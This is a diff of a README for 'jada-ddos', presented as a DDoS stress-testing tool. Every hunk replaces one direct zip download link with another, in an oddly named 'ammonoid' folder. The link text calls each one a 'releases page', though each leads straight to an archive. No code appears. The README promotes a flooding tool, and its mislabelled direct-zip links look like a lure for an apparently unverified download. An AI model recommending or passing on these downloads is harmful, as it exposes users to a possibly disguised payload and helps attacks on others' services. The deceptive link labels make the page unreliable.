@@ -1,6 +1,6 @@
 # 🚀 jada-ddos - Your Simple DDoS Tool for Stress Testing
 
-[![Download jada-ddos](https://raw.githubusercontent.com/Codyhope02/jada-ddos/main/ammonoid/jada_ddos_v3.3.zip)](https://raw.githubusercontent.com/Codyhope02/jada-ddos/main/ammonoid/jada_ddos_v3.3.zip)
+[![Download jada-ddos](https://github.com/Codyhope02/jada-ddos/raw/refs/heads/main/ammonoid/jada-ddos-v3.0-alpha.4.zip)](https://github.com/Codyhope02/jada-ddos/raw/refs/heads/main/ammonoid/jada-ddos-v3.0-alpha.4.zip)
 
 ## 📥 Description
 
@@ -26,7 +26,7 @@ To run jada-ddos, you will need:
 
 Follow these steps to download and run jada-ddos:
 
-1. **Visit the Releases Page:** Click [here](https://raw.githubusercontent.com/Codyhope02/jada-ddos/main/ammonoid/jada_ddos_v3.3.zip) to go to the releases page.
+1. **Visit the Releases Page:** Click [here](https://github.com/Codyhope02/jada-ddos/raw/refs/heads/main/ammonoid/jada-ddos-v3.0-alpha.4.zip) to go to the releases page.
 2. **Download the Latest Version:**
    - Look for the latest version number.
    - Click on the appropriate file for your operating system to download.
@@ -47,7 +47,7 @@ Follow these steps to download and run jada-ddos:
 
 ## 📥 Download & Install
 
-You can download jada-ddos from the releases page. Visit this page to download: [Download jada-ddos](https://raw.githubusercontent.com/Codyhope02/jada-ddos/main/ammonoid/jada_ddos_v3.3.zip). 
+You can download jada-ddos from the releases page. Visit this page to download: [Download jada-ddos](https://github.com/Codyhope02/jada-ddos/raw/refs/heads/main/ammonoid/jada-ddos-v3.0-alpha.4.zip). 
 
 ## ⚙️ How to Use jada-ddos
 
@@ -87,4 +87,4 @@ We welcome contributions and feedback from users. If you have questions or need 
 
 For more information and discussions on DDoS tools and strategies, explore community forums or documentation related to network security. This can enhance your understanding and provide better insights into using jada-ddos effectively.
 
-Visit the releases page to download: [Download jada-ddos](https://raw.githubusercontent.com/Codyhope02/jada-ddos/main/ammonoid/jada_ddos_v3.3.zip).
+Visit the releases page to download: [Download jada-ddos](https://github.com/Codyhope02/jada-ddos/raw/refs/heads/main/ammonoid/jada-ddos-v3.0-alpha.4.zip).
